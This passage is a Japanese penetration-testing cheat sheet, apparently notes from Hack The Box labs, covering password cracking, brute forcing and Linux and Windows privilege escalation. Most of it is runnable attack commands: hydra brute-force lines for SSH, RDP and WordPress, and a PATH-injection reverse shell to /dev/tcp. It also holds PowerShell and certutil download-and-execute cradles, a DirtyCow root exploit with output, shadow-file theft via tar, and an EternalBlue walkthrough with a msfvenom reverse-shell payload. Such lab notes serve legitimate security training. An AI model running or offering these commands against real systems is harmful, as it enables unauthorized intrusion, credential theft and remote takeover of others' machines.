Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
No password hashes left to crack (see FAQ)
```
```
┌──(kali㉿kali)-[~/htb/boxes/Delivery]
└─$ john --show hash                                                                                                
?:PleaseSubscribe!21

1 password hash cracked, 0 left
```

## hashcat
```
hashcat -m 0 -a 0 <パスワードファイル>　/usr/share/wordlist/rockyou.txt
```
- -m 0 = MD5
- -a 0 = 辞書攻撃

Hash tyep:
https://hashcat.net/wiki/doku.php?id=example_hashes

## hydra
- -l...単一のユーザー名の指定
- -L...ユーザーリストファイルの指定
- -p...単一のパスワードの指定
- -P...パスワードファイルの指定
- -s...カスタムポート(sshが22番以外のポートで使用されている時や、https/443を調べる場合に使用)
- -f...ログインとパスワードの組み合わせが少なくとも1つ見つかったら終了
- -V...各試行のログインとパスワードを表示(実行中の試行の様子が確認できる)

### HTTP Post Form
http-post-formを使用するためには「:」で区切られた3つのパラメータが必要。  
それぞれ「ログインページのpath」「BurpSuiteなどで取得したリクエスト」「エラーメッセージ」が必要となる。  
また、ユーザー名が不要なログインページでも「-l」のパラメータの設定が必要なため、「-l none」など適当に指定しておく。
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "<Login Page>:<Request Body>:<Error Message>"

例)
http:
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V
https:
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V -s 443
```

### FTP
```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 ftp
```

### SSH
```
hydra -f -l <user> -P /usr/share/wordlists/rockyou.txt 10.10.10.1 -t 4 ssh
```

### MySQL
```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 mysql
```

### SMB
```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 smb
```

### Wordpress
```
hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
### Windows RDP
```
hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.1
```

## patator
さまざまなプロトコルに対応したパスワードクラックツール。  
Hydraが成功しない時に、対応するプロトコルモジュールを指定して実行。  
下記はsshの例。
```
patator ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'
```

## Wordlist
```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists
/usr/share/seclists/Discoavery/DNS
```

## Wordlistの作成
### CeWL
指定されたURLを指定された深さまでスパイダーして単語リストを作成するツール。
```
cewl https://test.com/ -w dict.txt
```
- -w...ファイルに出力
- -d...ディレクトリの深さの指定

### crunch
自動で全ての組み合わせを出力するツール。  
下記の例では、最小2文字から最大3文字のワードリストを作成する。
```
crunch 2 3 -o dict.txt
```

### cupp
対話形式で個人をプロファイリングすることで、ワードリストを作成する。  
誕生日、ニックネーム、ペットの名前などを対話形式で答えていく。
```
cupp -i
```

### hashcat(ルールベース攻撃)
hashcatを用いて、キーワードを元にルールを用いてワードリストを作成することができる。  
ルールは自分で作成することも可能だが、/usr/share/hashcat/rulesを用いることで簡単にワードリストを作成することが可能。
```
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout keyword.txt
```
hashcat:Rule-based Attack  
https://hashcat.net/wiki/doku.php?id=rule_based_attack

## base64,16進数 → テキスト
```
cat test.txt | base64 -d
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" | base64 -d
```
```
cat test.txt | xxd -r -ps
```

## aircrack-ng
```
airmon-ng start wlan0
iwaconfig
airodump-ng wlan0mon
```
```
airodump-ng --channel 対象のチャンネル --bssid APのMACアドレス -w <output filename> wlan0mon
```
```
aircrack-ng <filename>.cap
```

# Privilege Escalation
## Linux
### チェック項目
- tty shell
- linpeas.shの実行(列挙)
- カーネルバージョンの確認(uname -a)
- sudoコマンドの権限確認(sudo -l)
- cronジョブの確認(crontab，systemd timer)
- SUID(find / -perm -u=s -type f 2>/dev/null)
- 開いているポートの確認(netstat -tulpn)
- 実行中のプロセスの確認(ps -aux，pspy)
- パスワードがWebアプリケーションのスクリプトにハードコーディングされていないか確認
- pspyを使用してuid=0(root権限)で定期的に実行されているスクリプトがないか確認
- その他テクニック


### tty shell
```
#bashが制限されている場合はsh
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/bash";'
perl: exec "/bin/bash";
ruby: exec "/bin/bash"
lua: os.execute('/bin/bash')
```

・Ctrl+c，Ctrl+zなどを利用可能にする

```
stty raw -echo; fg
<Enter><Enter>
```

```
kali@kali:stty -a(結果を下のrows columns に代入)  
victim:stty rows 16 columns 136
```

・clearなどを可能にする
```
export TERM=xterm
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

### enumツール
linpease.sh  
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
LinEnum.sh  
https://github.com/rebootuser/LinEnum

### カーネルバージョンを確認して、カーネルエクスプロイトを用いて権限昇格
```
uname -a
```

### sudoコマンド悪用して権限昇格
```
sudo -l
```

### cronジョブの確認
#### crontab
```
cat /etc/crontab
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
#### systemd timersの確認
/etc/systemd/system/配下にファイルを配置されているファイルをチェック(見たことがないファイルが置かれていないか)
- .service(定期実行するファイルのパスなどを記述)
- .timer(時間間隔の指定)
```
systemctl list-timers --all
```
```
find / -name *timer -type f 2>>/dev/null
```

##### (備考)systemd timerの有効化と起動
```
sudo systemctl start datetest.service
sudo systemctl start datetest.timer
```

### SUID
SUIDはset user IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
これを利用して、LinuxではSUIDビットが有効になってファイル所有者がrootになっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。
まずはSUIDファイルを見つける。
下記のコマンドを実行するとSUIDアクセス許可を物全てのバイナリを列挙することができる。
```
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```
```
特に/bin/screen-4.5.0などバージョンのついているものに注意
/bin/bash
/bin/cp
/bin/find
/bin/nano
/bin/vim
/bin/nmap (ver 2.02-5.21)
/bin/more
/bin/less
```
- /は、ファイルシステムの先頭（ルート）から開始し、すべてのディレクトリを検索
- -permは、後続の権限の検索
- -u=sは、rootユーザーが所有するファイルを検索
- -typeは、探しているファイルの種類を示します
- fは、ディレクトリや特殊ファイルではなく、通常のファイルを示す
- 2はプロセスの2番目のファイル記述子であるstderr（標準エラー）を示す
- &gt;はリダイレクトを意味する
- /dev/nullは、書き込まれたすべてのものを破棄する特別なファイルシステムオブジェクト

列挙後、権限昇格に使えそうなものをGTFOで調べる  
https://gtfobins.github.io/

### chmod777に設定したfile/dirを検索
```
find / -type f -perm 777
```

### Capability
SUIDはset user IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
これはファイルの所有者の権限でプログラム/ファイルを実行するための一時的なアクセス権をユーザーに与えるものとして定義されている。  
Capabilityは通常ルートに割り当てられているアクションを細かく分割して実行する仕組み。  
これを利用することで、通常80番ポートなどの1024以下のポートでWebサーバーなどをリッスンさせるためにはルート権限が必要だが、Webサーバーデーモンにroot権限を与えるのではなく、CAP_NET_BIND_SERVICEなどのCapabilitiesを設定することで簡単に80番ポートを開放することができる。  
python，perl，tarが表示されれば、Capablityを利用して権限昇格できる可能性あり。
```
getcap -r / 2>/dev/null
```
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl5.30.0 = cap_setuid+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

#### cap_setuid+ep
```
python3:
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl:
./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

#### cap_dac_read_search+ep
- tarを使用して/etc/shadowを圧縮
- shadow.tarが生成される
- shadow.tarを展開するとetc/shadowディレクトリが作成される
- catなどで読み取り、パスワードハッシュをjohnやhashcatで解析する
```
./tar cvf shadow.tar /etc/shadow
./tar -xvf shadow.tar
cat etc/shadow
```

#### ファイルの検索
```
find / -name <ファイル名> -type f 2>>/dev/null
```
- /...ファイルシステム全体を検索
- -name...名前の指定
- -type f...ディレクトリではなく、ファイル検索を指定
- 2>>/dev/null...全てのエラーを破棄


### 開いているポートの確認
```
netstat -tulpn
netstat -an(linux以外)
```

### 実行中のプロセスを確認
```
ps -aux
```

### *.sh実行時に「bad interpreter: No such file or directory」が表示されたら
改行コードをCRLFからLFに置換して実行できるかを確認する。
```
sed -i 's/\r//' *.sh
```

### pspy
ps auxコマンドでは確認できない定期的にUID=0(root権限)で実行されているスクリプトを確認することができる。  
馴染みのないプロセスが動作している場合、そのプロセスが権限昇格の鍵になる場合もあるため、要チェック。  


### その他テクニック
#### Path Injection
sudo・root権限で実行可能なスクリプト内にgzipやpsコマンドが記述されている場合、自分が用意したreverse shellなどを実行させるようにパスを書き換える。  
スクリプト実行時にroot権限でreverse shellが得られる。

```
echo $PATH
cd /tmp
# gzipの部分はインジェクションさせたいコマンド
echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" > gzip
chmod 777 gzip
export PATH=/tmp:$PATH
# root権限で動かせるスクリプトなどを実行(前提としてスクリプト内で上記のgzipなどが記述されている)
./backup.sh
whoami → root
```


#### ユーザを指定してコマンドを実行
```
www-data@bashed:/$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
www-data@bashed:/$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/$ whoami
scriptmanager
```

#### kernel exploit
#### dirtycow
・40839.c(dirty.c)
パスワードを自身で入力して、firefaltというアカウントを作成する
```
gcc -pthread dirty.c -o dirty -lcrypt
chmod 755 dirty
```
```
./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: pass

Complete line:
firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash

mmap: b778e000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'pass'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'pass'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

・40616.c(cowroot.c)
実行するだけでrootになれる
```
gcc cowroot.c -o cowroot -pthread
```
```
* $ ./cowroot
* DirtyCow root privilege escalation
* Backing up /usr/bin/passwd.. to /tmp/bak
* Size of binary: 57048
* Racing, this may take a while..
* /usr/bin/passwd is overwritten
* Popping root shell.
* Don't forget to restore /tmp/bak
* thread stopped
* thread stopped
* root@box:/root/cow# id
* uid=0(root) gid=1000(foo) groups=1000(foo)
```

#### tools
php-reverse-shell:  
https://github.com/pentestmonkey/php-reverse-shell   

privilege-escalation-awesome-scripts-suite:  
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  

pspy:  
https://github.com/DominicBreuker/pspy  

SUID3NUM:  
https://github.com/Anon-Exploiter/SUID3NUM

linux-exploit-suggester2:    
https://github.com/jondonas/linux-exploit-suggester-2


## Windows
### チェック項目
[]

### ファイルのダウンロード
```
curl http://10.10.10.1:9000/putty.exe -o putty.exe
certutil -urlcache -split -f "http://10.10.14.11:9000/rs.exe" rs.exe
bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11:9000/rs.exe', 'rs.exe')
powershell -c (Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe")
powershell -c (wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe")
powershell -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
```

#### ダウンロード&実行
```
powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.16:9001/nishang.ps1')"
```

#### SMBを用いたファイル共有
```
攻撃側(送信側):
python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp
```

```
被害者(受信側):
net view \\10.10.14.11
dir \\10.10.10.1\temp
copy \\10.10.10.1\temp\rs.exe rs.exe
```

### Powershell
#### Powershellスクリプトの実行
```
現在のユーザーの実行ポリシーの確認:
Get-ExecutionPolicy -Scope CurrentUser
現在のユーザーの実行ポリシーの変更:
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

### metasploit(local_exploit_suggester)
exploitをせずに脆弱性をチェックするために使用するモジュール。
meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。

```
use post/multi/recon/local_exploit_suggester
```

### windows-exploit-suggester
windowsでexploitを列挙するためのスクリプト
systeminfoコマンドの出力が必要
```
./windows-exploit-suggester.py --update
pip install xlrd
```
```
systeminfo > systeminfo.txt
./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
```

### evlilwinrm(5985)
WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。  
5985ポートが空いている時に使用。

#### インストール
```
gem install evil-winrm
```

#### 使い方
```
evil-winrm -u <username> -p <password> -i <remote host ip>
```

### MS17-010_EternalBlue(without metasploit)
エクスプロイトに必要なものを準備
この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。

```
wget https://www.exploit-db.com/raw/42315
mv 42315 eternalblue.py
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

次にimpacketもインストールしておかないと使うことができないので入っていない場合は落としておく。

```
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
```

もしもここでpipが入っていないと警告が出た場合は、

```
sudo apt install python-pip
```
をして、pipもインストール。

次にリバースシェルに使うペイロードをmsfvenomを利用して作成

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe > reverse.exe
```

次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。
まずUSERNAMEのところを下記の画像のように変更。

![](./image/2021-05-06-17-48-11.png)

次にsmb_pwn関数内のスクリプトを下記の画像のように変更。

![](./image/2021-05-06-17-48-54.png)

これで準備は完了
通信を受けるためにnetcatで待ち受けておく。

```
nc -lvp 1234
```

最後にeternalblue.pyを実行

```
┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
└──╼ $python eternalblue.py 10.10.10.40 ntsvcs
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8001af9560
SESSION: 0xfffff8a001bf5de0
.
.
.
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```
通信を待ち受けていたnetcatの方でシェルが取得できる。

![](./image/2021-05-06-17-49-20.png)